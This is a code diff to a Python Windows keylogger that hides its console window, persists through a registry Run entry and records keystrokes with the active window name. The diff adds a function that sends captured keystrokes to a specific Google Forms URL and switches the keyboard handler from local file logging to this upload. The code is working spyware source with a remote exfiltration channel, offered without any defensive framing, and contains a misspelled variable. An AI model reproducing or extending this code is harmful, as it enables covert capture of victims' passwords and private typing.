@@ -12,6 +12,9 @@ import win32event
 import win32api
 import winerror
 import argparse
+import requests
+import urllib2
+import urllib
 
 # Disallowing Multiple Instance
 mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
@@ -23,7 +26,7 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 class Keylogger():
 
     def __init__(self):
-        self.x = ''
+        self.logs = ''
         self.data = ''
         self.context = ''
         self.context_chg = 0
@@ -32,7 +35,8 @@ class Keylogger():
 
     # Hide Console
     def hide(self):
-        import win32console, win32gui
+        import win32console
+        import win32gui
         window = win32console.GetConsoleWindow()
         win32gui.ShowWindow(window, 0)
         return True
@@ -54,7 +58,7 @@ class Keylogger():
         SetValueEx(key2change, "Xenotix Keylogger",0,REG_SZ, new_file_path)
 
     # Local storage of logs
-    def local(self):
+    def local_logs(self):
         if len(self.data) > 0:
             with open("keylogs.txt", "a") as log_file:
                 if self.context_chg:
@@ -65,6 +69,21 @@ class Keylogger():
                     log_file.write(self.data)
                     log_file.close()
                 self.data = ''
+        return True
+
+    # Send logs to google form
+    def gfom_logs(self):
+        if len(self.data) > 10:
+            url = "https://docs.google.com/forms/d/1IiAbwTVPo05mS85FFZUAWwZ_EhxmhKzrxlkE58Gqyv8"  # google form url
+            klog = {'entry.Logs': self.data}  # field name
+            try:
+                dataenc = urllib.urlencode(klog)
+                req = urllib2.Request(url, dataenc)
+                response = urllib2.urlopen(req)
+                print(reponse)
+                self.data = ''
+            except Exception as e:
+                print(e)
         return True
 
     def OnKeyboardEvent(self, event):
@@ -88,7 +107,7 @@ class Keylogger():
                 self.context = event.WindowName
                 self.context_chg = 1
             print(self.data)  # debugging
-            self.local()
+            self.gfom_logs()
             self.context_chg = 0
         return True  # needs to return an integer value
 
@@ -98,6 +117,7 @@ class Keylogger():
         return True
 
 if __name__ == '__main__':
+
     parser = argparse.ArgumentParser(description="Keylogger")
     parser.add_argument('-l', default='local', help='How to store logs [local|gdrive]')
     args = parser.parse_args()
